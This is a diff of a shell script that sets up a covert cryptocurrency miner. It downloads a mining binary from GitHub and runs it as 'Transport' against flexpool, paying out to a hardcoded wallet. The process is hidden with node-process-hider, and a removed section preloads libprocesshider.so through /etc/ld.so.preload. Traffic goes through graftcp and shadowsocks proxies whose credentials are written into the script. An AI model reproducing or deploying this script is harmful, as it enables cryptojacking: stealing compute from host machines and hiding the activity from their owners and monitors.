@@ -1,45 +1,42 @@
-#!/bin/sh
-sudo apt update && apt install screen -y
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
 apt-get install -y nodejs
 
 npm i -g node-process-hider
 
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 176.53.133.217:57597
-socks5_username = 2BHVpyGPD
-socks5_password = 1rN14HAmV
+socks5 = 52.203.46.122:1080
+socks5_username = mikrotik999
+socks5_password = Elibawnos
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
 
 sleep .2
 
-echo " "
-echo " "
-
-echo ""
-
 ./graftcp/graftcp curl ifconfig.me
 
 echo " "
 echo " "
 
-echo ""
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Transport
+chmod +x Transport
 
-echo " "
-echo " "
+apt -y install shadowsocks-libev rng-tools
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
-chmod +x bezzHash
+ss-local -s 52.203.46.122 -p 8388 -l 9999 -k Elibawnos -m chacha20-ietf-poly1305 -v &
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
-unzip magicBezzHash.zip
-make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-ph add bezzHash
-screen -dmS ls nohup ./bezzHash --url=0x11880b1cfe04907c5306222be1e09f4bbb480eb5.$(echo $(shuf -i 1-9999 -n 1)-sty)@us-etc.2miners.com:1010 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99 > nohup.out
+ph add Transport
+
+./Transport -a etchash -o stratum+ssl://eth-us-east.flexpool.io:5555 -u 0x11880b1cfe04907c5306222be1e09f4bbb480eb5.$(echo $(shuf -i 1-9999 -n 1)-sty) -p x -w Transport --no-sni --dns-https-server 1.1.1.1 --proxy 127.0.0.1:9999
